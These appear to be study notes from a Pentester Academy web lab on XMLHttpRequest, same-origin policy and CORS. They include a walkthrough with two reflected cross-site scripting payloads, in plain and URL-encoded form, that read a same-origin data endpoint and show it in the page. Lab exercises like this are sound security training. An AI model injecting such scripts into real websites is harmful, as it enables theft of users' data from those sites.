XMLHttpRequest

**********************************************************************************************************************************

XHR
https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest

Same origin policy
Resource sharing allowed only if from same origin
Origin based on Protocol, Port and Host combination
https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy

Cross Origin Resource Sharing
Server decides based on origin domain
https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS
http://stackoverflow.com/questions/2533049/cross-origin-resource-sharing-cors-am-i-missing-something-here

**********************************************************************************************************************************

Walkthrough

http://pentesteracademylab.appspot.com/lab/webapp/jfp/xhr?url=www
http://pentesteracademylab.appspot.com/lab/webapp/jfp/xhr/data
http://meyerweb.com/eric/tools/dencoder/

Before encoding :-
<script>

var req = new XMLHttpRequest();

req.onreadystatechange = function ()
{
   if (req.readyState == 4 && req.status == 200)
      {

         response_data = req.responseText;
         alert(response_data);

      }

}

req.open("GET", "/lab/webapp/jfp/xhr/data", true);
req.send();


</script>

After encoding :-
%3Cscript%3E%0A%0Avar%20req%20%3D%20new%20XMLHttpRequest()%3B%0A%0Areq.onreadystatechange%20%3D%20function%20()%0A%7B%0A%20%20%20if%20(req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200)%0A%20%20%20%20%20%20%7B%0A%0A%20%20%20%20%20%20%20%20%20response_data%20%3D%20req.responseText%3B%0A%20%20%20%20%20%20%20%20%20alert(response_data)%3B%0A%0A%20%20%20%20%20%20%7D%0A%0A%7D%0A%0Areq.open(%22GET%22%2C%20%22%2Flab%2Fwebapp%2Fjfp%2Fxhr%2Fdata%22%2C%20true)%3B%0Areq.send()%3B%0A%0A%0A%3C%2Fscript%3E

http://pentesteracademylab.appspot.com/lab/webapp/jfp/xhr?url=%3Cscript%3E%0A%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%0Areq.onreadystatechange%20%3D%20function%20%28%29%0A{%0A%20%20%20if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%0A%20%20%20%20%20%20{%0A%0A%20%20%20%20%20%20%20%20%20response_data%20%3D%20req.responseText%3B%0A%20%20%20%20%20%20%20%20%20alert%28response_data%29%3B%0A%0A%20%20%20%20%20%20}%0A%0A}%0A%0Areq.open%28%22GET%22%2C%20%22%2Flab%2Fwebapp%2Fjfp%2Fxhr%2Fdata%22%2C%20true%29%3B%0Areq.send%28%29%3B%0A%0A%0A%3C%2Fscript%3E

Before encoding :-
<script>

var req = new XMLHttpRequest();

req.onreadystatechange = function ()
{
   if (req.readyState == 4 && req.status == 200)
      {

         response_data = req.responseText;
         document.getElementById("result").innerHTML = response_data;

      }

}

req.open("GET", "/lab/webapp/jfp/xhr/data", true);
req.send();


</script>

After encoding :-
%3Cscript%3E%0A%0Avar%20req%20%3D%20new%20XMLHttpRequest()%3B%0A%0Areq.onreadystatechange%20%3D%20function%20()%0A%7B%0A%20%20%20if%20(req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200)%0A%20%20%20%20%20%20%7B%0A%0A%20%20%20%20%20%20%20%20%20response_data%20%3D%20req.responseText%3B%0A%20%20%20%20%20%20%20%20%20document.getElementById(%22result%22).innerHTML%20%3D%20response_data%3B%0A%0A%20%20%20%20%20%20%7D%0A%0A%7D%0A%0Areq.open(%22GET%22%2C%20%22%2Flab%2Fwebapp%2Fjfp%2Fxhr%2Fdata%22%2C%20true)%3B%0Areq.send()%3B%0A%0A%0A%3C%2Fscript%3E

http://pentesteracademylab.appspot.com/lab/webapp/jfp/xhr?url=%3Cscript%3E%0A%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%0Areq.onreadystatechange%20%3D%20function%20%28%29%0A{%0A%20%20%20if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%0A%20%20%20%20%20%20{%0A%0A%20%20%20%20%20%20%20%20%20response_data%20%3D%20req.responseText%3B%0A%20%20%20%20%20%20%20%20%20document.getElementById%28%22result%22%29.innerHTML%20%3D%20response_data%3B%0A%0A%20%20%20%20%20%20}%0A%0A}%0A%0Areq.open%28%22GET%22%2C%20%22%2Flab%2Fwebapp%2Fjfp%2Fxhr%2Fdata%22%2C%20true%29%3B%0Areq.send%28%29%3B%0A%0A%0A%3C%2Fscript%3E

**********************************************************************************************************************************
